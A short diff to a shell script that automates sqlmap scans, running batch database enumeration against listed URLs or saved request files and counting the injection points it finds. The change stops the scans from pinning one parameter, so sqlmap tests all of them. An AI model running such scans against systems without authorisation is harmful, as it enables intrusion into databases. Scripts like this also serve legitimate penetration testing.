@@ -47,9 +47,9 @@ then
 
 			if [ "$choice" == "1" ]
 			then
-				sqlmap -u "$file" -p EIO --dbs --batch --output-dir=$pwd/"$date"/$i  --timeout 1000000 --random-agent --no-cast --text-only --threads 9 --level 3 > "$date"/$i.log
+				sqlmap -u "$file" --dbs --batch --output-dir=$pwd/"$date"/$i  --timeout 1000000 --random-agent --no-cast --text-only --threads 9 --level 3 > "$date"/$i.log
 			else
-				sqlmap -r "$path/$file" -p password --dbs --batch --output-dir=$pwd/"$date"/$i  --timeout 1000000 --random-agent --no-cast --text-only --threads 9 --level 3 > "$date"/$i.log	
+				sqlmap -r "$path/$file" --dbs --batch --output-dir=$pwd/"$date"/$i  --timeout 1000000 --random-agent --no-cast --text-only --threads 9 --level 3 > "$date"/$i.log	
 			fi
 
 			found=`cat "$date"/$i.log | grep "sqlmap identified the following injection points" | wc -l`
